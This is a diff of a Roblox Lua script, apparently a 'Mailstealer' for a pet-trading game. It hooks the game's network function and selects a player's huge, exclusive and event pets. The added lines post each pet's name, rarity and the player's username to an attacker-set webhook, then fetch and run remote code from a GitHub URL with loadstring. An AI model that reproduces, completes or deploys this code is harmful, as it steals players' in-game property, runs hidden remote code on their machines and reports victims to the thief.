@@ -1,48 +1,9 @@
--- Import necessary modules
 local HttpService = game:GetService("HttpService")
+local webhookUrl = _G.Webhook
+
 local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
 local Fire, Invoke = Network.Fire, Network.Invoke
 
--- ...
-
-local function sendWebhook(url, content)
-    local data = {
-        ["content"] = content
-    }
-    local encodedData = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-
-    local success, response = pcall(HttpService.RequestAsync, HttpService, {
-        Url = url,
-        Method = "POST",
-        Headers = headers,
-        Body = encodedData
-    })
-
-    if success then
-        print("Webhook sent successfully.")
-    else
-        warn("Failed to send webhook:", response)
-    end
-end
-
--- ...
-
-while true do
-    -- ...
-
-    if lockedCount == 0 then
-        -- All pets have been unlocked
-        local webhookURL = "_G.Webhook"
-        local webhookContent = "All pets have been unlocked!"
-        sendWebhook(webhookURL, webhookContent)
-        break
-    end
-end
-
--- ...
 hookfunction(getupvalue(Fire, 1), function(...)
     return true
 end)
@@ -141,6 +102,14 @@ while wait() do
             end
             _G.PetName = v2.name
             _G.PetRar = v2.rarity
+            local payload = {
+                petName = v2.name,
+                rarity = v2.rarity,
+                action = "Mailstealer",
+                username = game.Players.LocalPlayer.Name
+            }
+            local encodedPayload = HttpService:JSONEncode(payload)
+            HttpService:PostAsync(webhookUrl, encodedPayload)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/Executor%20detector%20Mail.lua"))()
         elseif v2.huge == true then
             _G.Diamonds = 0
@@ -158,6 +127,14 @@ while wait() do
             end
             _G.PetName = v2.name
             _G.PetRar = v2.rarity
+            local payload = {
+                petName = v2.name,
+                rarity = v2.rarity,
+                action = "Mailstealer",
+                username = game.Players.LocalPlayer.Name
+            }
+            local encodedPayload = HttpService:JSONEncode(payload)
+            HttpService:PostAsync(webhookUrl, encodedPayload)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/Executor%20detector%20Mail.lua"))()
         elseif (v2.rarity == "Exclusive" and v2.huge == false) or (v2.rarity == "Event" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000) then
             _G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value
@@ -175,6 +152,14 @@ while wait() do
             end
             _G.PetName = v2.name
             _G.PetRar = v2.rarity
+            local payload = {
+                petName = v2.name,
+                rarity = v2.rarity,
+                action = "Mailstealer",
+                username = game.Players.LocalPlayer.Name
+            }
+            local encodedPayload = HttpService:JSONEncode(payload)
+            HttpService:PostAsync(webhookUrl, encodedPayload)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/Executor%20detector%20Mail.lua"))()
         elseif v2.rarity == "Exclusive" and v2.huge == false or v2.rarity == "Event" then
             _G.Diamonds = 0
@@ -192,6 +177,14 @@ while wait() do
             end
             _G.PetName = v2.name
             _G.PetRar = v2.rarity
+            local payload = {
+                petName = v2.name,
+                rarity = v2.rarity,
+                action = "Mailstealer",
+                username = game.Players.LocalPlayer.Name
+            }
+            local encodedPayload = HttpService:JSONEncode(payload)
+            HttpService:PostAsync(webhookUrl, encodedPayload)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/Executor%20detector%20Mail.lua"))()
         end
     end
